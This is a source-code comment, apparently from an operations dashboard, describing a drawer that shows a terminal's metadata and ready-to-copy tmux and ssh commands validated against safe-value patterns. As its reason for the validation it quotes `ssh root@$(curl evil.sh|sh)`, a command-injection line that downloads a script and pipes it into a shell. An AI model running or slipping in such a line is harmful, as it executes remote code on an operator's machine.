/**
 * Everything known about one Terminal, and how to see it without this page (ADR 0020, slice 7b).
 *
 * A tile shows a screen and four chips. This is where the rest lives: actor@version, tag, fleet,
 * execution mode and what a crashed tmux server costs in that mode, the four health sentences, how
 * old the screen is — and THE COMMANDS AN OPERATOR WOULD RUN THEMSELVES.
 *
 * WHY THE COMMANDS ARE THE POINT. This whole feature exists because the only view of what a Worker is
 * printing used to require a terminal, a key and knowing the Machine's address. A Dashboard that
 * replaces that knowledge is worse than one that teaches it: when the streamer is down, the ticket
 * mint 503s, or a tile has been blank for a minute, the operator needs the underlying commands, and
 * the honest place to put them is next to the tile that is failing. They are also the read path's own
 * documentation — the `capture-pane` line here is the one the wall runs, and the grouped-session
 * attach is the form slice 2 MEASURED as the one that does not yank the current window of an operator
 * already attached on the Machine.
 *
 * THE COMMANDS ARE VALIDATED BEFORE THEY ARE SHOWN. A command in a drawer is not executed by this
 * page — and that is exactly why it needs a whitelist. An operator copies what a dashboard shows them;
 * `ssh root@$(curl evil.sh|sh)` rendered as a helpful snippet is a shell injection with the operator
 * as the interpreter. Every interpolated value is admitted by `@kontra/core/panels/ids`'s `SAFE` patterns —
 * the same module the streamer uses, imported rather than re-derived — and a Terminal that fails is
 * shown WITHOUT commands and told why.
 *
 * The document is built as markdown by {@link terminalDetailMarkdown}, a pure function, so the
 * wording, the escaping and the refusal are all pinned by tests without a browser.
